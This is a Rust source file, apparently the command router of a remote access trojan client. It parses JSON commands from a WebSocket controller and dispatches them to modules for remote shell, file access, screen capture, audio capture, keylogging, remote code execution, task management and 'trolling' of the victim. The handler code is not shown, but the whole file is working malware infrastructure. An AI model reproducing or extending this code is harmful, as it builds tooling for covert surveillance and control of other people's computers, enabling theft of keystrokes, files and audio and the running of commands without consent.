use futures_util::stream::SplitSink;
use tokio::net::TcpStream;
use tokio_tungstenite::{tungstenite::Message, MaybeTlsStream, WebSocketStream};

use crate::handlers::{
    audio::Audio, chat::Chat, file_system::FileSystem, func::Function, keylogger::KeyLogger,
    remote_cmd::RemoteCMD, remote_code_execution::RemoteCodeExecution, remote_screen::RemoteScreen,
    task_manager::TaskManager, trolling::Trolling,
};

pub type SocketWriter<'a> = SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>;

use serde::Deserialize;

#[derive(Deserialize)]
pub struct CommandMessage {
    pub module: String, // Module name
    // `args` is different for each module, so `serde_json::Value` is used
    // This allows us to postpone argument parsing until a specific handler is called.
    pub args: serde_json::Value,
}
pub async fn route_message(text: String, socket: &mut SocketWriter<'_>) -> anyhow::Result<()> {
    let msg: CommandMessage = serde_json::from_str(&text)?;

    match msg.module.as_str() {
        "RSH" => RemoteCMD::handler(msg.args, socket).await,
        "FS" => FileSystem::handler(msg.args, socket).await,
        "RS" => RemoteScreen::handler(msg.args, socket).await,
        "AD" => Audio::handler(msg.args, socket).await,
        "CH" => Chat::handler(msg.args, socket).await,
        "KL" => KeyLogger::handler(msg.args, socket).await,
        "RCE" => RemoteCodeExecution::handler(msg.args, socket).await,
        "TM" => TaskManager::handler(msg.args, socket).await,
        "TRL" => Trolling::handler(msg.args, socket).await,
        _ => anyhow::bail!("Unknown module '{}'", msg.module),
    }
}
